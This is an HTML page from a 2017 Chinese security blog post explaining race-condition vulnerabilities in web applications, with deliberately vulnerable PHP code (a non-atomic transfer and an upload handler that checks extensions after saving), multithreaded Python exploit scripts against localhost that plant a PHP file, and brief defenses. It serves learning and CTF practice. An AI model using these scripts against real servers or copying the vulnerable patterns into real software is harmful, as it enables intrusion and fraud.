@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        Web中的条件竞争漏洞 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpeg" />
+        </div>
+        <div class="name">
+            <i>seaii</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>COLLECT</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-text">0x02漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="toc-text">0x03漏洞测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98"><span class="toc-text">0x03漏洞实战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-text">0x04漏洞防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">0x05参考资料</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        Web中的条件竞争漏洞
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2017-04-26 23:01:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#web" title="web">web</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#条件竞争" title="条件竞争">条件竞争</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h3 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h3><p>放假回家前更一篇~ 之前做xctf联赛的时候多次碰到了这种类型的题目，之前没有好好了解过，被虐了很多次之后终于下定决心来仔细研究了解一波这个漏洞。。。</p>
+<span id="more"></span>
+
+<h3 id="0x02漏洞成因"><a href="#0x02漏洞成因" class="headerlink" title="0x02漏洞成因"></a>0x02漏洞成因</h3><p>首先了解一个定义——竞争条件是什么？</p>
+<blockquote>
+<p>竞争条件”发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。      ——<a href="https://en.wikipedia.org/wiki/Synchronization" target="_blank">Wikipedia-computer_science</a></p>
+</blockquote>
+<p>开发者在进行代码开发时常常倾向于认为代码会以<code>线性</code>的方式执行，而且他们忽视了<code>并行服务器会并发执行多个线程</code>，这就会导致意想不到的结果。</p>
+<p>线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。在我理解就是两只哈士奇（线程）同时去抢一个丢出去的飞盘（资源），不知道到底哪只能抢到，此处便形成了竞争。</p>
+<h3 id="0x03漏洞测试"><a href="#0x03漏洞测试" class="headerlink" title="0x03漏洞测试"></a>0x03漏洞测试</h3><p>只是干巴巴的说些定义可能对这个漏洞的理解不够透彻，最简单直接的方法还是自己用代码来测试一下。<br>现在我们模拟一个转账的情景<br><img src="https://seaii-blog.com/usr/uploads/2017/04/636319640.jpg" alt="![]()"><br>前端水平有限，就是用来展示结果的，不要在意细节。。。。<br>后端处理代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;SELECT rest FROM account&quot;</span>;</span><br><span class="line">	<span class="variable">$rest</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>)-&gt;<span class="title function_ invoke__">fetch_assoc</span>()[<span class="string">&#x27;rest&#x27;</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;SELECT own FROM account&quot;</span>;</span><br><span class="line">	<span class="variable">$own</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>)-&gt;<span class="title function_ invoke__">fetch_assoc</span>()[<span class="string">&#x27;own&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="keyword">array</span>(</span><br><span class="line">			<span class="string">&quot;rest&quot;</span> =&gt; <span class="variable">$rest</span>,</span><br><span class="line">			<span class="string">&quot;own&quot;</span>  =&gt; <span class="variable">$own</span>,</span><br><span class="line">		);</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>);</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">		<span class="variable">$money</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;money&#x27;</span>]);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$money</span> &lt;= <span class="variable">$rest</span>) &#123;</span><br><span class="line">			<span class="variable">$result</span> = <span class="keyword">array</span>(</span><br><span class="line">				<span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;success&quot;</span>,</span><br><span class="line">				<span class="string">&quot;rest&quot;</span>   =&gt; <span class="variable">$rest</span> - <span class="variable">$money</span>,</span><br><span class="line">				<span class="string">&quot;own&quot;</span>    =&gt; <span class="variable">$own</span>  + <span class="variable">$money</span>, </span><br><span class="line">			);</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">			<span class="variable">$sql</span> = <span class="string">&quot;UPDATE account SET rest=rest-&quot;</span>.<span class="variable">$money</span>;</span><br><span class="line">			<span class="comment">//$sql = &quot;UPDATE account SET rest=&quot;.$result[&#x27;rest&#x27;];</span></span><br><span class="line">			<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">			<span class="variable">$sql</span> = <span class="string">&quot;UPDATE account SET own=own+&quot;</span>.<span class="variable">$money</span>;</span><br><span class="line">			<span class="comment">//$sql = &quot;UPDATE account SET own=&quot;.$result[&#x27;own&#x27;];</span></span><br><span class="line">			<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$result</span> = <span class="keyword">array</span>(</span><br><span class="line">				<span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;failed&quot;</span>,</span><br><span class="line">				<span class="string">&quot;rest&quot;</span>   =&gt; <span class="variable">$rest</span>,</span><br><span class="line">				<span class="string">&quot;own&quot;</span>    =&gt; <span class="variable">$own</span>,</span><br><span class="line">			);</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>配合前端ajax写的，后来测试中发现前端页面完全没用到23333333<br>使用py模拟转账操作，代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/race_condition.php&quot;</span></span><br><span class="line">threads = <span class="number">25</span></span><br><span class="line">q = queue.Queue()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    q.put(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> q.empty():</span><br><span class="line">        q.get()</span><br><span class="line">        r = requests.post(url, data=&#123;<span class="string">&#x27;money&#x27;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads):</span><br><span class="line">        t = threading.Thread(target=post)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>
+<p>因为这个漏洞很受环境因素的影响，比如网络延迟、服务器的处理能力等，所以只执行一次可能并不会成功，尝试几次后意想不到的结果还是发生了。。。<br><img src="https://seaii-blog.com/usr/uploads/2017/04/3140873624.jpg" alt="![]()"></p>
+<p>由于多线程访问，数据库update一次的时间内update了多次，导致数据出现错误，这在银行、电商等有支付的地方影响是巨大的。</p>
+<h3 id="0x03漏洞实战"><a href="#0x03漏洞实战" class="headerlink" title="0x03漏洞实战"></a>0x03漏洞实战</h3><p>要找个实战还真是不容易，在网上翻了半天只找到几个比较老的漏洞，一般会将其归为逻辑漏洞。看了一下套路都差不多，我简化了一下步骤，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$allowtype</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line">    <span class="variable">$size</span> = <span class="number">10000000</span>;</span><br><span class="line">    <span class="variable">$path</span> = <span class="string">&quot;./&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error:can not move!&quot;</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error:not an upload file！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$newfile</span> = <span class="variable">$path</span>.<span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;file upload success.file path is: &quot;</span>.<span class="variable">$newfile</span>.<span class="string">&quot;\n&lt;br /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$newfile</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Upload file error: &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">array_pop</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$allowtype</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$newfile</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error:upload the file type is not allowed，delete the file！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>简单解释一下，首先<code>将文件上传到服务器</code>，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”。<br>我们的利用思路是这样的，首先上传一个php文件，内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;info.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RaceCondition</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line"></span><br><span class="line">        self.url = <span class="string">&#x27;http://127.0.0.1/a.php&#x27;</span></span><br><span class="line">        self.uploadUrl = <span class="string">&#x27;http://127.0.0.1/race.php&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;try to call uploaded file...&#x27;</span>)</span><br><span class="line">        r = requests.get(self.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*] create file info.php success.&#x27;</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_upload</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;upload file...&#x27;</span>)</span><br><span class="line">        file = &#123;<span class="string">&#x27;myfile&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;a.php&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)&#125;</span><br><span class="line">        requests.post(self.uploadUrl, files=file)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                self._get()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">                self._upload()</span><br><span class="line">                self._get()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    threads = <span class="number">50</span>    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>
+<p>经过几次尝试，成功得到了shell。<br><img src="https://seaii-blog.com/usr/uploads/2017/04/774421538.jpg" alt="QQ截图20170427230316.jpg"></p>
+<p><img src="https://seaii-blog.com/usr/uploads/2017/04/4252760807.jpg" alt="QQ截图20170427230349.jpg"></p>
+<h3 id="0x04漏洞防御"><a href="#0x04漏洞防御" class="headerlink" title="0x04漏洞防御"></a>0x04漏洞防御</h3><ul>
+<li>对于数据库的操作，正牌的方法是设置锁，这个之后还要仔细研究一下。</li>
+<li>对于文件上传，一定要经过充分完整的检查之后再上传，不要玩花样。。。</li>
+<li>在操作系统的角度，共享数据要进行上锁保护（互斥？同步？）</li>
+</ul>
+<h3 id="0x05参考资料"><a href="#0x05参考资料" class="headerlink" title="0x05参考资料"></a>0x05参考资料</h3><ul>
+<li><p><a href="http://www.freebuf.com/articles/network/107077.html" target="_blank">测试Web应用程序中的竞争条件</a></p>
+</li>
+<li><p><a href="http://www.jianshu.com/p/7501f2e20626" target="_blank">逻辑漏洞</a></p>
+</li>
+<li><p><a href="http://cb.drops.wiki/bugs/wooyun-2014-049794.html" target="_blank">PHPCMS前台设计缺陷导致任意代码执行</a></p>
+</li>
+<li><p><a href="http://bobao.360.cn/news/detail/3281.html" target="_blank">Web中的条件竞争（Race conditions）漏洞</a></p>
+</li>
+<li><p><a href="http://wiki.secbug.net/web_race-condtion.html" target="_blank">Race Conditions&#x2F;条件竞争</a></p>
+</li>
+</ul>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
